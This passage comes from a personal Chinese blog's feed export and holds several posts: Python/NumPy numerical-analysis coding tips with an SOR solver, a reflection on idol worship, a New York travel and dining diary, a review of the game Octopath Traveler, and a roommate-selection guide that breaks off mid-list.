<p>瞬间把之前的几行代码压缩成了一行。这样写的坏处是括号比较多，在没有括号高亮的情况下容易出现漏括号或者多括号的情况。</p>
<h2 id="vectorize">Vectorize</h2>
<p>这个方法全靠 Numpy。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">i = np.arange(<span class="number">1</span>,n//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">sum1 = <span class="keyword">lambda</span> i: f(a+(<span class="number">2</span>*i-<span class="number">1</span>)*h)</span><br><span class="line">vfunc = np.vectorize(sum1)</span><br><span class="line">np.<span class="built_in">sum</span>(vfunc(i))</span><br></pre></td></tr></table></figure>
<p>这个思路感觉和 <code>map</code> 的思路类似，但是优势是创建了一个可以复用的 Vectorize Function，可以接受数组的输入。</p>
<h2 id="another-for-loop">Another For Loop</h2>
<p>这个其实和 <code>for loop</code> 没什么区别，知识短了一点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">np.<span class="built_in">sum</span>([f(a+(<span class="number">2</span>*i-<span class="number">1</span>)*h) <span class="keyword">for</span> i <span class="keyword">in</span> np.arange(<span class="number">1</span>,n//<span class="number">2</span>+<span class="number">1</span>) ])</span><br></pre></td></tr></table></figure>
<p>这个方法会比较灵活。在面对多个参数的时候会比较好用。比如有一个函数 f(a,b,c,d), 只有 c 这个参数需要变化，a,b,d 都是不要变化的。我们可以写这样写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">[f(a,b,c,d) <span class="keyword">for</span> c <span class="keyword">in</span> np.arange(n)]</span><br></pre></td></tr></table></figure>
<h2 id="矩阵点乘">矩阵点乘</h2>
<p>这里我们用一个简单一点的例子。我们需要计算<span class="math inline">\(\sum_{i=0}^{n}a_ib_i\)</span>。这个的本质其实是 a 和 b 两个矩阵的点乘。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[...]</span><br><span class="line">b=[...]</span><br><span class="line">np.dot(a,b)</span><br></pre></td></tr></table></figure>
<h1 id="快速生成一个矩阵">快速生成一个矩阵</h1>
<p>这个很简单。例如生成一个 5*5 矩阵。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">np.zeros((<span class="number">5</span>, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<h1 id="table">Table</h1>
<h2 id="tabulate"><a href="https://bitbucket.org/astanin/python-tabulate/src/master/">Tabulate</a></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(tabulate([[<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>],[<span class="string">&quot;Alice&quot;</span>,<span class="number">24</span>],[<span class="string">&quot;Bob&quot;</span>,<span class="number">19</span>]],headers=<span class="string">&quot;firstrow&quot;</span>))</span><br><span class="line"><span class="comment"># Name      Age</span></span><br><span class="line"><span class="comment"># ------  -----</span></span><br><span class="line"><span class="comment"># Alice      24</span></span><br><span class="line"><span class="comment"># Bob        19</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(tabulate(&#123;<span class="string">&quot;Name&quot;</span>: [<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>],</span><br><span class="line"><span class="string">&quot;Age&quot;</span>: [<span class="number">24</span>, <span class="number">19</span>]&#125;, headers=<span class="string">&quot;keys&quot;</span>))</span><br><span class="line"><span class="comment">#   Age  Name</span></span><br><span class="line"><span class="comment"># -----  ------</span></span><br><span class="line"><span class="comment">#    24  Alice</span></span><br><span class="line"><span class="comment">#    19  Bob</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="plotly"><a href="https://plotly.com/python/table/">Plotly</a></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> plotly.graph_objects <span class="keyword">as</span> go</span><br><span class="line"></span><br><span class="line">fig = go.Figure(data=[go.Table(header=<span class="built_in">dict</span>(values=[<span class="string">&#x27;A Scores&#x27;</span>, <span class="string">&#x27;B Scores&#x27;</span>]),</span><br><span class="line">                 cells=<span class="built_in">dict</span>(values=[[<span class="number">100</span>, <span class="number">90</span>, <span class="number">80</span>, <span class="number">90</span>], [<span class="number">95</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">95</span>]]))</span><br><span class="line">                     ])</span><br><span class="line">fig.show()</span><br></pre></td></tr></table></figure>
<h1 id="plot">Plot</h1>
<p>我每次都记不住怎么画图。</p>
<h2 id="matplotlib">matplotlib</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">9</span>,<span class="number">6</span>))</span><br><span class="line">ax.loglog(hs,composite_trapezoid_rule_error_func1,<span class="string">&#x27;bo-&#x27;</span>,label=<span class="string">&#x27;CTR ERROR&#x27;</span>,lw=<span class="number">2</span>)</span><br><span class="line">ax.loglog(hs,np.power(hs,<span class="number">2</span>),<span class="string">&#x27;ro-&#x27;</span>,label=<span class="string">&#x27;err(h) = h^2&#x27;</span>,lw=<span class="number">2</span>)</span><br><span class="line">ax.set_title(<span class="string">&quot;Error in CTR approximation&quot;</span>,fontsize=<span class="number">22</span>)</span><br><span class="line">ax.legend(fontsize=<span class="number">15</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;h&#x27;</span>,fontsize=<span class="number">22</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;err(h)&#x27;</span>,fontsize=<span class="number">22</span>)</span><br><span class="line">ax.xaxis.set_tick_params(labelsize=<span class="number">15</span>)</span><br><span class="line">ax.yaxis.set_tick_params(labelsize=<span class="number">15</span>)</span><br></pre></td></tr></table></figure>
<h1 id="伪代码翻译">伪代码翻译</h1>
<p>数组的索引从 0 开始，但是很多伪代码是从 1 开始。为了方便翻译，我们可以在所有数组的开头插入一个 0，这样数组的有效数据便从索引 1 开始。这样伪代码和实际代码之间的索引便不会错了。以下为例子。</p>
<center>
<img class="lazyload" data-src="/static/images/numerical_analysis_code1.png" height="80%" width="80%">
</center>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sor</span>(<span class="params">a,b,XO,omega,TOL,N</span>):</span></span><br><span class="line">    n=<span class="built_in">len</span>(a)</span><br><span class="line">    x=np.zeros(n+<span class="number">1</span>)</span><br><span class="line">    a = np.insert(a,<span class="number">0</span>,<span class="number">0</span>,axis=<span class="number">1</span>)</span><br><span class="line">    a = np.insert(a,<span class="number">0</span>,<span class="number">0</span>,axis=<span class="number">0</span>)</span><br><span class="line">    b = np.insert(b,<span class="number">0</span>,<span class="number">0</span>,axis=<span class="number">0</span>)    </span><br><span class="line">    XO = [<span class="number">0.0</span>]+XO</span><br><span class="line">    <span class="comment"># step 1</span></span><br><span class="line">    k=<span class="number">1</span></span><br><span class="line">    <span class="comment"># step 2</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;=N:</span><br><span class="line">        <span class="comment"># step 3</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> np.arange(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            sum1=<span class="built_in">sum</span>([a[i][j]*x[j] <span class="keyword">for</span> j <span class="keyword">in</span> np.arange(<span class="number">1</span>,i)])</span><br><span class="line">            sum2=<span class="built_in">sum</span>([a[i][j]*XO[j] <span class="keyword">for</span> j <span class="keyword">in</span> np.arange(i+<span class="number">1</span>,n+<span class="number">1</span>)])</span><br><span class="line">            x[i]=(<span class="number">1</span>-omega)*XO[i]+<span class="number">1</span>/a[i][i]*(omega*(np.negative(sum1)-sum2+b[i]))</span><br><span class="line">        <span class="comment"># step 4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>(np.<span class="built_in">abs</span>(b-np.dot(a,x)))&lt;TOL:</span><br><span class="line">            print(<span class="string">f&#x27;Number of Iterations: <span class="subst">&#123;k&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> x[<span class="number">1</span>:]</span><br><span class="line">        <span class="comment"># step 5</span></span><br><span class="line">        k = k+<span class="number">1</span></span><br><span class="line">        <span class="comment"># step 6</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> np.arange(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            XO[i]=x[i]</span><br><span class="line">    print(<span class="string">&#x27;Maximum number of iterations exceed&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> XO</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> np.allclose(sor([[<span class="number">4</span>,<span class="number">3</span>,<span class="number">0</span>],[<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>],[<span class="number">0</span>,-<span class="number">1</span>,<span class="number">4</span>]],[<span class="number">24</span>,<span class="number">30</span>,-<span class="number">24</span>],[<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>],<span class="number">1.25</span>,<span class="number">1e-05</span>,<span class="number">1000</span>),[<span class="number">3</span>,<span class="number">4</span>,-<span class="number">5</span>], rtol=<span class="number">1e-05</span>, atol=<span class="number">1e-08</span>, equal_nan=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数值分析</tag>
        <tag>Numerical Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>神不在的我的身边</title>
    <url>/posts/baab5fe8/</url>
    <content><![CDATA[<p>人不会是神。 <a id="more"></a></p>
<p>这几年有越来越多的男神，女神冒了出来。男神和女神几乎就是流量的代名词，很吸睛。但是其实我对其有着深深的质疑。</p>
<p>先从崇拜者的角度来说。每个崇拜者心中都有接近男神或女神的渴望。他们将自己喜欢的人奉为男神或女神，也许是为了赞美，表达自己的善意或者诚意。我一直很想说，既然你想接近你喜欢的人，又为什么要将其奉为男神或女神呢？这样是凭白给自己加大难度，由于地位差异所产生的难度。这就像去逛家电市场，售货员还什么都没说呢，你就指定说我要这款电视，非要不可。这种情况下，售货员不是想怎么宰你就怎么宰你么。</p>
<p>人就是人，神就是神。所谓的女神男神就是人，他们不是神。或者说他们离我心目印象中的身太远了。在他们身上有的只是人性，不存在丝毫的神性。我所谓的神性是指没有自私，虚伪等品质。并不需要有什么正面积极的品质，只是不要有这些负面的品质。这些所谓的男神和女神离神差远了。我更加赞同宅们，把二次元人物奉为男神女神，至少二次元里的人物不是人。它们更加接近与完美，每一个动作都可以被诠释。在我心中，女神就是一把审美的尺子。她代表的是我心中对完美的逼近。我的女神是 月社妃。至少在现在，她的性格是非常符合我的审美的。</p>
所谓的男神和女神又有什么用呢？
<hr>
我只是单纯觉得夕阳，衣服以及这张照片的构图很美。
<center>
<img class="lazyload" data-src="/static/images/nvshengift.jpg" height="50%" width="50%">
</center>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
      </tags>
  </entry>
  <entry>
    <title>纽约</title>
    <url>/posts/82de8aa1/</url>
    <content><![CDATA[<p>春假去了一趟纽约。</p>
<a id="more"></a>
<p>不得不赞叹纽约的繁华。</p>
<p>纽约由几个区组成：</p>
<ul>
<li>曼哈顿：可以说是最繁华的地方</li>
<li>布鲁克林：有着各式各样的工厂，犹太人的居住区</li>
<li>泽西：曼哈顿的卫星城，有很多的居民</li>
<li>长岛：纽约有名的富人区</li>
<li>皇后区：里面有着最大的华人区，法拉盛</li>
</ul>
<p>这些区我并没有全去过。我住在泽西，天天往城里也就是曼哈顿跑，去过一次布鲁克林。</p>
<h2 id="初见">初见</h2>
<p>纽约靠着大西洋，哈得孙河绕城而过。提到纽约的桥，或许大家只记得布鲁克林大桥，曼哈顿大桥这些有名的。实际上纽约的桥远远不止这些。据纽约当地人说，一共有 22 座桥。仔细看一看地图，曼哈顿与周边区的连接都是靠着桥和河底隧道。</p>
<p>曼哈顿算是纽约最繁华的地方。我第一次见到这么一大块地方到处都是高楼林立。楼与楼之间的间隔可以说是没有，大家紧挨在一起。经常可以看到不同风格，不同时代的房子紧靠在一起。左边还是一栋玻璃外墙的现代购物中心，右手边就突然出现了一个七八十年代的砖制建筑。</p>
<center>
<img class="lazyload" data-src='/static/images/ny2.png' height="80%" width="80%"/>
</center>
<p>纽约的道路异常狭窄，一个小胡同就是一条路。就是那种刚刚够开一辆汽车，比北京胡同还小的路。为了缓解堵车，纽约的道路多为单行线。这算是治标不治本的方法。毕竟道路扩张不会是个简单的事情，左右两边都还有房子呢。那么未来十年，纽约的道路又会是什么样的场景呢？至少现在，还没有一个可以代替汽车的出行工具，或许 Uber？</p>
<p>纽约道路另一大特色就是其红绿灯之多。往往几十米就有一个红绿灯，只要是路口的地方就有一个红绿灯。这与加州的情况不同。加州基本只有主干道上有红绿灯，小路上的红绿灯很少。即使一个十字路口，也不会使用红绿灯。红绿灯多除了带来秩序，也给行人带来了时间成本。在纽约，人们大多不看红绿灯，而是看有没有车开过。行人看到没有车通过十字路口，不管什么颜色的灯，便快速走过。这就有点像中国式过马路了。</p>
<p>以上道路的特性不可避免的带来了拥堵。曼哈顿是我第一次见到从出发地到目的地走路比驾车快的地方。但是曼哈顿打车会很便宜，因为曼哈顿面积不大。从一头到另一头，可能也就四五十刀。反观洛杉矶，每一个大型购物商城门前都有一个超大的停车场，从城市的一头到另一头铁定得走高速。在洛杉矶以打车代步的人可谓是奢侈。</p>
<p>曼哈顿的道路命名中规中矩，第一大道，第二大道，就这样一个个排列下去。垂直于这些大道的是街。西一街，东一街之类的。曼哈顿的道路并不弯弯绕绕，横就是横，竖就是竖。但是有这样的三角结构。一条路变为两条路，中间的三角区域变为公园。</p>
<center>
<img class="lazyload" data-src='/static/images/ny1.png' height="80%" width="80%"/>
</center>
<h2 id="时代广场">时代广场</h2>
<p>时代广场是一个色彩缤纷，亮瞎眼睛的地方。他的道路结构就是之前提到的三角形。中间是广场，两边是建筑。道路上大车小车川流不息。站在广场上，可以体会到那种被高楼包围的感觉。头顶是黑暗的天空，高楼的幕墙上却是五颜六色的广告屏。在这，广告是最亮眼的存在，各种颜色，各种亮度刺激着游客。就连路两旁的店铺门头，也比不上他们。</p>
<h2 id="帝国大厦">帝国大厦</h2>
<p>很难想象，1930 年，人们在一年多一些的时间里建造出这么高的楼。当时还没有现代化的施工设施，工人靠着双手，将一根根钢梁搭建起来。帝国大厦的门票不算便宜，三四十刀的样子。站在三四百米的地方俯视纽约。在不同的方向可以看到不同的风景。有城市的繁华，高楼林立，灯光闪烁，广告屏，霓虹灯。有的方向却是星星点点的灯火，黑漆漆的哈得孙河。</p>
<p>观景台上有观光用的望远镜。从那个望远镜能够看到远处河上的自由女神像，也可以看到大楼里的人们在做什么。</p>
<p>我那天去的时候，地平线处还有一抹夕阳。就像一块歪着的橘红色的布，耷拉在那。待天色晚些，气温也下降，风也大了起来。帝国大厦的顶层甚至飘起了雪。</p>
<center>
<img class="lazyload" data-src='/static/images/ny3.png' height="80%" width="80%"/>
</center>
<center>
<img class="lazyload" data-src='/static/images/ny4.png' height="80%" width="80%"/>
</center>
<p>图中白色的是高空的雾气。</p>
<p>平日早上纽约市区的高层建筑都隐藏在云雾之中。</p>
<p>关于帝国大厦，曾经帝国大厦的顶端是一个 61 米的飞艇碇泊塔。然而在一次飞艇停泊时，海军飞艇上喷射出来的压仓水把几个街区以外的行人都弄得浑身湿透，最后不得不拆除了这个碇泊塔。</p>
<h2 id="吃">吃</h2>
<p>纽约有不少好吃的。纽约有 76 家米其林餐厅，其中 5 家是米其林三星。各国料理都可以在纽约找到，都有着不错的味道。就拿日料和中餐举例，味道都是很不错的。不像我村子里的日料和中餐，米饭都做不好。</p>
<h3 id="熟成牛排">熟成牛排</h3>
<p>这是我第一次吃到熟成牛排，ry-Aged NY Strip Steak。具体来说熟成的感觉果真是不同的。一刀切下去，不再会有那么多汁水流出来，不会有种牛排好像是块海绵的感觉，里面都是汁。熟成牛排的汁水不是那么多，但是剩下的都锁在了肉里。肉的口感也有很大的提升，更加的紧实，还有一些发酵的风味。</p>
<center>
<img class="lazyload" data-src='/static/images/ny5.png' height="80%" width="80%"/>
</center>
<h3 id="寿司">寿司</h3>
<p>我吃到了一个神奇的茄子寿司。听着奇怪，但是吃起来却不是那回事。有着奇特的口感。软软糯糯的茄子，茄子皮并不像平时吃的那样碍事。平日里的茄子或许调味有些困难，但是这次的寿司上的茄子却一点也不淡。其他的寿司也都挺好吃的，具体也说不出来什么。大致就是饭好，鱼好，味道好。</p>
<h3 id="le-bernardin">Le Bernardin</h3>
<p>一家米其林三星餐厅，主打法餐和海鲜。具体介绍可以看这个-&gt;<a href="https://zhuanlan.zhihu.com/p/31294201">传送门</a>。</p>
<p>这个里面介绍过的我就不过多的赘述了。</p>
<p>这是一家很正式的餐厅，有着较为严格的着装要求。球鞋，牛仔裤一概是不被允许的，上衣一定要是 Jakcet。这个规定对我这样的游客一点都不友好。毕竟我可不会带着皮鞋之类的，因为球鞋比较适合走路。</p>
<p>在餐厅的门口，还设有一个衣帽间。客人可以在这寄存外套，以及借西装。没错，这儿要求穿着西装进餐。环顾餐厅，也就只有我一个，里面穿着 T 恤，外面套着不合身的西装。</p>
<p>午餐的套餐是 90 刀，它的菜单很简单，菜品以烹饪方式分类。上面是各种我看不懂的鱼和酱汁的名字。</p>
<p>别人餐前面包都是蘸黄油吃，这儿的餐前面包却是蘸着三文鱼吃。三文鱼切成了小丁，拌在一起。颜色非常的鲜艳。给味道平淡的面包增添了不少鲜味。但不知道为什么，三文鱼酱里还有着一些腥味。</p>
<center>
<img class="lazyload" data-src='/static/images/ny6.png' height="80%" width="80%"/>
</center>
<p>饮料也很有意思。我点的是苹果生姜汽水。这是我有史以来喝过的带生姜的最好喝的饮料。生姜味道没有太冲，也没有太辣，反而显得比较清爽。树莓饮料里的冰倒是堆放的很用心。一杯饮料中，浸没在液体里的冰是一大块一大块的，一个个堆叠在一起。在饮料的最上端是向冰沙一样的一堆冰，被大块大块的冰顶出水面。</p>
<center>
<img class="lazyload" data-src='/static/images/ny7.png' height="80%" width="80%"/>
</center>
<p>在进餐期间，会有服务员捧着新鲜出炉的各种面包走到桌前，给你介绍每一种面包的名字，问你要吃哪一个。</p>
<p>上菜环节，餐厅也力求完美。我是两个人一起去吃饭。一共有两道菜加一个甜品。每次都是两个人的菜由两个服务员同时呈上来，介绍一遍菜后，给你现场淋上酱汁。</p>
<center>
<img class="lazyload" data-src='/static/images/ny8.png' height="80%" width="80%"/>
</center>
<center>
<img class="lazyload" data-src='/static/images/ny9.png' height="80%" width="80%"/>
</center>
<center>
<img class="lazyload" data-src='/static/images/ny10.png' height="80%" width="80%"/>
</center>
<center>
<img class="lazyload" data-src='/static/images/ny11.png' height="80%" width="80%"/>
</center>
<p>我们点的甜品中，其中一个是椰子。这是一个长的像椰子，基本所有材料也取自于椰子的甜品。这道甜品中具有浓烈的椰香。服务员还特地过来提醒我们，椰子的壳也是可以吃的，是巧克力做的。具体甜品的制作过程在这-&gt;<a href="https://www.youtube.com/watch?v=Lwq2WfpY-ss">传送门</a></p>
<center>
<img class="lazyload" data-src='/static/images/ny12.png' height="80%" width="80%"/>
</center>
<h3 id="茶">茶</h3>
<p>在洛克菲尔中心走进了一家喝茶的地方。和中国的茶室不一样，这间茶室通透，亮堂，白色的大理石在地上蔓延开来。茶具也以金属为主，不是木头。</p>
<p>服务员端上茶后，特意嘱咐我们一分钟后把带有茶叶的漏勺拿出。看了一眼漏勺，盛有的是拼配茶，且多是碎茶叶。</p>
<p>除开茶之外，还有许多配料，比如蜂蜜之类的。最为神奇的是提供了茶饼干。茶饼干长得像蛋卷，吃上去是红糖饼干的感觉。</p>
<p>价格是真的便宜。十刀就是坐一下午。</p>
<center>
<img class="lazyload" data-src='/static/images/ny13.png' height="80%" width="80%"/>
</center>
<p>拔草完。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>旅游</tag>
        <tag>纽约</tag>
      </tags>
  </entry>
  <entry>
    <title>八方旅人 Octopath</title>
    <url>/posts/e3b5b73d/</url>
    <content><![CDATA[<p>八方旅人不值八方。 <a id="more"></a> 八方旅人还未上架PC平台我便注意到了它。虽然我不怎么玩回合制游戏，但是这个画风和音乐实在是吸引我。精致的像素画风配上真实的光影造就了随风摇曳的小草和波光粼粼的河岸。主界面的<a href="http://music.163.com/song?id=865857523">音乐</a>也是有风一般旅人的感觉。</p>
<center>
<img class="lazyload" data-src="/static/images/octopath1.jpg" height="80%" width="80%" href="https://steamcommunity.com/app/921570/screenshots/?p=1&browsefilter=toprated">
</center>
看这水，一点都不像素风。
<center>
<img class="lazyload" data-src="/static/images/octopath2.jpg" height="80%" width="80%" href="https://steamcommunity.com/app/921570/screenshots/?p=1&browsefilter=toprated">
</center>
<p>但这游戏我还是鸽了，打不下去了。最主要的原因是刷的累。主线剧情是一截一截的，达到了一定等级便可以在指定位置激活剧情(越级打怪又是另一会事情)。那么如果我打完了这个阶段的主线，但还没有达到下一段主线的等级呢？那就靠野外刷刷刷。</p>
<p>除了刷刷刷花时间，盗贼偷装备也是有成功概率的。偷失败了怎么办，读档。面对动不动百分之三，百分之五的成功几率，读档是家常便饭。在一座城市累积偷盗5次失败后，需要缴纳一笔罚金才能再拥有5次机会。一座城市里的好东西可不止那么一点点。所以贪婪如我就疯狂读档，交尽可能少的罚金去偷完所有的东西。</p>
<p>当然了，让我不想玩下去的还是它的战斗系统。足够多的刷刷刷搭配上一个拖沓的战斗系统葬送了我大部分时间。主线故事没看多少，战斗却已经花了不少时间。例如打一个野外副本boss可能需要我二十分钟。不紧张不刺激机械式地按二十分钟手柄打消了我玩下去的想法。如果还在战斗最后一刻暴毙，删游戏的想法自然而然地浮现了上来。游戏中有一个舞女角色。她的技能是随机给Buff，有好有坏。其中甚至有百分之一的几率出现十倍经验。为了收益最大化（打野外boss也是为了经验）, 舞女拼命在战斗中跳舞。但有时候跳舞会导致暴毙。例如连续出现两个特定的 Debuff。一个是全员濒死只剩一滴血，第二个是全员受到一次爆炸伤害。一瞬间，十几分钟的努力化为乌有。</p>
<p>八方旅人中怪物的护盾机制十分特殊。需要使用特定的元素魔法或者特定的武器种类打击数次后才能破盾。打破之后持续一回合的破防状态是输出的好机会，往往可以造成成倍的伤害。并且破防后，怪物会进入一回合的眩晕状态。因此往往是用两三个回合削护盾。破盾前上好buff，好好利用破盾的那一回合进行输出。</p>
<p>遇到怪物的方式也和口袋妖怪类似。在野外走会有几率遇到怪物。地图上的宝箱往往是看得见，但是不知道怎么走过去，也就是道路是隐藏的。多走走去寻找正确的通往宝箱的路又会碰上怪物。拖沓的战斗系统又拖慢了我野外找宝箱的节奏。看得见，摸不着，也懒得摸的宝箱就静静的躺在那。</p>
<p>总的来说战斗系统太过拖沓，导致我耗费非常多的时间在上面。主线剧情被等级要求给切成了一段段的，并不能有效的驱动我打下去。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>八方旅人</tag>
        <tag>日式RPG</tag>
        <tag>像素风</tag>
      </tags>
  </entry>
  <entry>
    <title>How to pick a roomate</title>
    <url>/posts/590ead09/</url>
    <content><![CDATA[<p>如何寻找室友一直是一间令人头疼的事情。 <a id="more"></a></p>
<h2 id="introduction">Introduction</h2>
<p>作者：<a href="https://blog.inevitable.tech">陆逸平</a> 叶晓华 2018.04.09</p>
<p>人们总是不喜欢孤独的。相信各位同学有考虑过大学找舍友分享宿舍吧。和合适的人分享宿舍不仅是对生活经济的节省也是对于社交生活的接近，当然我们也会面对很多单人所无法接触的事件。各位难免会碰到棘手的问题-如何寻找合适的pong友。我们就这里分享一下自己对室友寻找方面的看法吧。</p>
<h2 id="什么是合适的舍友">什么是合适的舍友</h2>
<p>在现在的普世道德观下，一个好的舍友应该热爱学习，爱干净，阳光开朗，乐于助人。但是这样的室友对<strong>你</strong>来说真的是一个好的舍友么？如果你热爱安静，你真的可以忍受一个对你不停嘘寒问暖（产生噪音）的优秀室友么？</p>
<p>什么是适合的舍友？</p>
<p>一个适合的舍友与你应该有相似的习惯。这样你不需要强迫他去遵守一些你的习惯，也不需要对他的习惯进行妥协。一切真的就是随意就好。如果你想要有更高的生活标准，那么你应该与你的舍友应该共同进步。而不是你寄期望于一个有着高素质，高生活标准的舍友来忍受你，来拉你一把。</p>
<p>每个人的包容程度都是不一样的。对于包容程度比较大的人来说，一个合适的舍友意味着40%的相似处（很多相似并不是一眼就可以看出来的，而是根植与习惯，性格，三观的相似）。可能对于比较排外的人来说，一个合适的舍友意味着80%的相似处。一味的追求多元化，最后累到的是自己。人与人的不同之处，意味着潜在的冲突。与一个有着不同生活习惯，性格，爱好的人生活，天天就跟打仗一样，我们通过一切手段让自己在意志的碰撞中取胜。在意志的胜负中，两人的习惯不断改变，不断的靠近。和谐生活或许非常的遥远。</p>
<p>因此合适是一个非常个性化的东西。在寻找舍友之前，你需要明确你需要什么样的舍友。合适对你来说到底是什么。</p>
<h2 id="交流前须知">交流前须知</h2>
<ol type="1">
<li>在社交群里冒泡发言就是交流的第一步。对一个内心渴望合适的舍友的人来说，不主动与人交流，积极去筛选舍友，而是等待合适的舍友找上门的行为就是守株待兔，很难有好的收获。社交工具以及网络发达的现在，我们可以利用搜索引擎和基于人工智能的推荐找到各种各样的群体与个体。机会变多的同时，朋友的门槛也在降低。可能由于三观差异过大，现在能相互顺畅交流的人，并且这个交流也让双方感觉舒适的情况也不多。只要你能大胆的进行自我的介绍以及提出寻找室友的渴望（顺畅的交流+共同的诉求),你们就已经是半个朋友了。</li>
<li>三思而后行。考虑更多而不是匆忙决定。永远不要因为欠妥的考虑而在将来因为极为严重的后果想要反悔。</li>
<li>在交流的刚开始，双方一定无法论及灵魂深处的东西！因此交流应该从由浅入深，从一些公开的信息逐渐步入个人想法（有些个人想法已经算是个人隐私了）。 考察相互间是否谈论的投机(如果不能那么在宿舍互相刷手机、尬聊也没意思。) 。而且你很难在一开始就为对方做出一个精准画像，例如性格， 以及一些羞于示人的想法（p.s. 像我这样真诚的人可是不多）。因此在交流的刚开始去确定这个人是不是符合自己的风格是十分困难的。</li>
<li>随着一些基本信息的交流，思维在不断的碰撞，我们会互相发现令人好奇或共鸣之处。 不经意间，双方的信任不断加深，交流内容逐渐由浅入深，触及灵魂深处的想法。我们提倡互相坦诚而不是畏缩与躲藏。隐瞒非常容易被看穿，所以我们强烈不建议使用隐瞒（可以拒绝）。每个人都有自己独特的，不同的想法。如果这些想法是经过自己所验证的，那么大胆的说出来，因为它们是合理的（合乎理性，因为经过验证）。</li>
<li>选舍友不是一蹴而就的。如果谈不来，那你就勇敢地表达出“你不适合做我的舍友”，请不要畏惧挫折。</li>
</ol>
<h2 id="necessary-question">Necessary Question</h2>
<ul>
<li><p>学术兴趣</p>
<p>你申请中学术兴趣，学术活动怎么写的，你就怎么聊。</p></li>
<li><p>课外兴趣</p>
<ul>
<li><p>技能</p>
<p>一些技术：比如修电脑，做视频后期，音频后期。</p></li>
<li><p>读书（包括网络小说）</p>
<p>读书涉及到意识倾向以及审美。考虑到大家不喜欢读书，所以别忘了还有网络小说。</p></li>
<li><p>游戏/二次元</p>
<p>有些人会喜欢3A大作，竞技性强的游戏。然而有些人喜欢有着自己独特创意的独立游戏。二次元们可以聊聊心中的本命。</p></li>
<li><p>运动，体育</p>
<p>没什么好说，我不懂体育。</p></li>
<li><p>音乐品味</p>
<p>一个喜欢轻音乐的人绝对不会想碰上一个喜欢听电音摇滚，并且成天拿着音箱外放音乐的舍友。</p></li>
<li><p>电影品味</p>
<p>涉及影视审美。</p></li>
<li><p>男神/女神</p>
<p>涉及关于人的审美。</p></li>
</ul></li>
<li><p>生活细节</p>
<ul>
<li><p>睡觉习惯</p>
<ul>
<li><p>睡觉时间</p></li>
<li><p>呼噜</p>
<p>听说轻微呼噜可以增进睡眠质量哦。</p></li>
</ul></li>
<li><p>饮食习惯</p>
<ul>
<li><p>忌口</p>
<p>跟着一个不吃虾的同学，一个不吃鱼的同学，出门只能吃肉了。</p></li>
<li><p>零食</p>
<p>每天回去发现垃圾筒中塞满了薯片，巧克力的包装袋。</p></li>
</ul></li>
<li><p>个人卫生</p>
<ul>
<li><p>洗澡频率（早上or晚上）</p></li>
<li><p>家务</p>
<p>打扫卫生的重要性。</p></li>
</ul></li>
<li><p>噪音（安静/吵闹）</p>
<p>有的人一刻都安静不下来，叽叽喳喳个不停。</p></li>
<li><p>氛围（进步学术／退步玩耍）</p>
<p>整天吵着打LOL的舍友和整天找你看书，写代码的舍友选哪个呢？</p></li>
<li><p>消费观念</p>
<ul>
<li><p>对于消费的认知</p></li>
<li><p>对商品的价值的看法。</p></li>
</ul>
<p>我只是把你买耳机的预算拿去买了块HHKB静电容键盘，一点都不贵。</p></li>
</ul></li>
<li><p>性格</p>
<p>你需要明白你要一个什么样性格的舍友。接下来是一些简单的评估性格的标准，可以帮助你筛选舍友。</p>
<ul>
<li><p>MBTI</p>
<p>很老旧的性格测试，但是很简单。</p>
<ul>
<li>Extraversion/Introversion</li>
<li>Sensing/Intuition</li>
<li>Thinking/Feeling</li>
<li>Judging/Perceiving</li>
</ul></li>
<li><p>孙子兵法</p>
<p>更老旧的看人方法，衡量一个人的能力。(对将领个人能力的要求)</p>
<ul>
<li>智</li>
<li>信</li>
